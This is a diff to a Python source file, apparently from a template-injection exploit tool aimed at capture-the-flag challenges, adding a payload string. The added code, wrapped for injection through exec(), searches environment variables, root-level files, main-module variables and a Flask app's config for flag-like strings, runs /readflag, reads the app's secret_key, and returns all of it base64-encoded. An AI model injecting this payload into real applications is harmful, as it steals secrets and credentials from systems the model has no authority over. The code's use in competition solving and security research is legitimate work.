@@ -313,6 +313,39 @@ BRAINROT_VARNAMES = [
     "sb",
 ]
 
+GETFLAG_CODE = """
+def f():
+    import os,pathlib,base64,json,re
+    flag_re = re.compile(r"\\{\\S{2,100}\\}")
+    data = {}
+    data["environ"] = {k:v for k,v in os.environ.items() if flag_re.search(v)}
+    data["files"] = {
+        path.as_posix(): text
+        for dir in [".", "/"]
+        for path in pathlib.Path(dir).glob('f*')
+        if path.is_file() and os.access(path, os.R_OK)
+        for text in [path.read_text()]
+        if len(text) < 200 and flag_re.search(text)
+    }
+    main = __import__("__main__").__dict__
+    data["vars"] = {
+        k: v
+        for d in [
+            main,
+            main.get("app",{}).__dict__.get("config"),
+        ]
+        if d
+        for k, v in d.items()
+        if isinstance(v, str) and flag_re.search(v)
+    }
+    readflag = pathlib.Path("/readflag")
+    data["readflag"] = os.popen("/readflag").read() if readflag.exists() and os.access(readflag, os.X_OK) else None
+    data["secert_key"] = main.get("app",{}).__dict__.get("secret_key")
+    return "start"+base64.b64encode(json.dumps(data).encode()).decode()+"stop"
+"""
+
+GETFLAG_CODE_EVAL = f"[exec({GETFLAG_CODE!r}),f()][-1]"
+
 # charcodes that not supported by python3.2 are removed.
 UNICODE_INT_CHARCODES = [
     [1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641],
